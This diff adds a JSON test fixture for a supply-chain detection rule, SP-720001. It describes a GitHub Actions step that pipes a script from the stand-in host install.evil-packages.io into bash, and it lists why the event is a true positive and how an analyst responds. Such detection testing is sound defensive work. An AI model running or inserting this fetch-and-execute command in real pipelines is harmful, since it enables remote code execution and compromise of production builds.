@@ -1,0 +1,34 @@
+{
+  "_comment": "TRUE POSITIVE — SP-720001: CI/CD Pipeline executing curl|bash (T1195.001 — Supply Chain)",
+  "rule_id": "SP-720001",
+  "expected_result": "ALERT",
+  "severity": "HIGH",
+  "confidence": 82,
+  "scenario": "GitHub Actions workflow step executes 'curl https://external.domain | bash' — remote code execution from untrusted source in build pipeline",
+  "mitre": "T1195.001",
+  "event": {
+    "sourcetype": "github:audit",
+    "action": "workflow_run.completed",
+    "repository": "contoso/backend-api",
+    "workflow": ".github/workflows/build.yml",
+    "actor": "dependabot[bot]",
+    "ref": "refs/heads/main",
+    "step_name": "Install dependencies",
+    "step_run": "curl -fsSL https://install.evil-packages.io/installer.sh | bash",
+    "conclusion": "success",
+    "time": "2024-01-15T14:30:00Z"
+  },
+  "why_tp": [
+    "curl|bash pattern: downloads and immediately executes remote script without verification",
+    "Domain install.evil-packages.io is not in the approved vendor list",
+    "Run in a build pipeline that produces artifacts deployed to production",
+    "Triggered by dependabot[bot] — unusual actor for a main branch build step"
+  ],
+  "analyst_action": [
+    "IMMEDIATELY: Pause all deployments from the contoso/backend-api pipeline",
+    "Review all artifacts produced by this workflow run — consider them compromised",
+    "Investigate how this step appeared in the workflow file (git blame, PR history)",
+    "Check if this step was present in previous runs and what it installed",
+    "Rebuild from a known-good commit before this change"
+  ]
+}
